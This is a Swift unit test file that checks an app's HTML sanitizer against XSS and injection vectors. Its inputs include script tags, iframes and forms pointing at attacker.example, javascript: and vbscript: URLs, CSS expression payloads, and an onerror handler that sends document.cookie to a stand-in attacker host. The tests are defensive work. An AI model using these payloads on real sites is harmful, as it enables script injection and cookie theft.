import XCTest
@testable import OllamaBob

/// Phase 0b regression tests for the SwiftSoup-backed `PresentationService.sanitizeHTML`.
/// Each test exercises a known prompt-injection / XSS vector and asserts the
/// dangerous fragment does not survive sanitization. These are pre-WebView
/// checks; the CSP, JS-disabled, and navigation-blocking layers in
/// `RichHTMLView` are independent backstops.
@MainActor
final class PresentationSanitizerTests: XCTestCase {

    // MARK: - Element-level removal

    func testStripsScriptTagsEntirely() {
        let cleaned = PresentationService.sanitizeHTML(
            "<p>hello</p><script>alert(1)</script><p>world</p>",
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<script"))
        XCTAssertFalse(cleaned.contains("alert(1)"))
        XCTAssertTrue(cleaned.contains("hello"))
        XCTAssertTrue(cleaned.contains("world"))
    }

    func testStripsIframesEvenWhenRemoteResourcesAllowed() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<p>before</p><iframe src="https://attacker.example/evil"></iframe><p>after</p>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<iframe"))
        XCTAssertFalse(cleaned.contains("attacker.example"))
        XCTAssertTrue(cleaned.contains("before"))
        XCTAssertTrue(cleaned.contains("after"))
    }

    func testStripsBaseTag() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<base href="https://attacker.example/"><a href="/relative">click</a>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<base"))
        XCTAssertFalse(cleaned.contains("attacker.example"))
    }

    func testStripsFormAndInputElements() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<form action="https://attacker.example/" method="POST"><input name="x" value="y"></form>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<form"))
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<input"))
        XCTAssertFalse(cleaned.contains("attacker.example"))
    }

    func testStripsScriptInsideSVG() {
        let cleaned = PresentationService.sanitizeHTML(
            "<svg><circle r=\"5\"/><script>alert(1)</script></svg>",
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("<script"))
        XCTAssertFalse(cleaned.contains("alert(1)"))
    }

    // MARK: - Attribute scrubbing

    func testStripsOnEventHandlersFromAllElements() {
        let cleaned = PresentationService.sanitizeHTML(
            ##"<a href="#" onclick="steal()">x</a><img src="data:image/png;base64,iVBOR" onerror="steal()" onload="steal()">"##,
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("onclick"))
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("onerror"))
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("onload"))
        XCTAssertFalse(cleaned.contains("steal()"))
    }

    func testRemovesOnerrorEvenWhenRemoteResourcesAllowed() {
        // Ensures attribute scrubbing runs independently of the remote-resource toggle.
        let cleaned = PresentationService.sanitizeHTML(
            #"<img src="https://tracker.example/p.gif" onerror="fetch('https://attacker/'+document.cookie)">"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("onerror"))
        XCTAssertFalse(cleaned.contains("document.cookie"))
        // The <img> tag survives (allowRemoteResources == true), but the dangerous handler is gone.
        XCTAssertTrue(cleaned.localizedCaseInsensitiveContains("<img"))
    }

    func testStripsJavascriptURLsFromAnchors() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<a href="javascript:alert(1)">click</a>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("javascript:"))
        XCTAssertFalse(cleaned.contains("alert(1)"))
    }

    func testStripsVBScriptURLs() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<a href="vbscript:msgbox('x')">click</a>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("vbscript:"))
        XCTAssertFalse(cleaned.contains("msgbox"))
    }

    func testStripsNonImageDataURLs() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.contains("data:text/html"))
        XCTAssertFalse(cleaned.contains("PHNjcmlwdD"))
    }

    func testAllowsImageDataURLs() {
        // Inline image data is the one data: variant we keep.
        let cleaned = PresentationService.sanitizeHTML(
            #"<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAA">"#,
            allowRemoteResources: false
        )
        XCTAssertTrue(cleaned.contains("data:image/png"))
    }

    // MARK: - Remote-resource gating

    func testStripsRemoteImgSrcWhenRemoteResourcesDisallowed() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<img src="https://tracker.example/p.gif">"#,
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.contains("tracker.example"))
    }

    func testKeepsRemoteImgSrcWhenRemoteResourcesAllowed() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<img src="https://example.com/picture.jpg">"#,
            allowRemoteResources: true
        )
        XCTAssertTrue(cleaned.contains("example.com/picture.jpg"))
    }

    func testStripsRemoteSrcsetWhenRemoteResourcesDisallowed() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<img srcset="https://a.example/x.jpg 1x, https://a.example/x@2x.jpg 2x">"#,
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.contains("a.example"))
    }

    // MARK: - Inline style XSS vectors

    func testStripsCSSExpression() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<div style="width: expression(alert(1))">x</div>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("expression("))
        XCTAssertFalse(cleaned.contains("alert(1)"))
    }

    func testStripsCSSBehavior() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<div style="behavior: url(htc:evil)">x</div>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("behavior:"))
    }

    func testStripsCSSAtImport() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<div style="@import 'evil.css'">x</div>"#,
            allowRemoteResources: true
        )
        XCTAssertFalse(cleaned.localizedCaseInsensitiveContains("@import"))
    }

    func testStripsRemoteUrlInInlineStyleWhenRemoteResourcesDisallowed() {
        let cleaned = PresentationService.sanitizeHTML(
            #"<div style="background: url(https://tracker.example/x.png)">x</div>"#,
            allowRemoteResources: false
        )
        XCTAssertFalse(cleaned.contains("tracker.example"))
    }

    // MARK: - Benign content survives

    func testKeepsHeadingsAndTextAndLocalLinks() {
        let cleaned = PresentationService.sanitizeHTML(
            ##"<h1>Title</h1><p>Hello <a href="#anchor">link</a></p>"##,
            allowRemoteResources: false
        )
        XCTAssertTrue(cleaned.contains("Title"))
        XCTAssertTrue(cleaned.contains("Hello"))
        XCTAssertTrue(cleaned.contains("#anchor"))
    }

    func testKeepsHTTPLinksWhenRemoteResourcesAllowed() {
        // Plain anchor links to https targets are legitimate; the sanitizer
        // keeps them when remote resources are allowed.
        let cleaned = PresentationService.sanitizeHTML(
            #"<a href="https://example.com/article">read</a>"#,
            allowRemoteResources: true
        )
        XCTAssertTrue(cleaned.contains("example.com/article"))
    }

    // MARK: - Sanitizer version metadata

    func testHTMLSanitizerVersionIsExposed() {
        // The constant exists so future hardening can be tracked. Phase 0b ships v1.
        XCTAssertGreaterThanOrEqual(AppConfig.htmlSanitizerVersion, 1)
    }
}
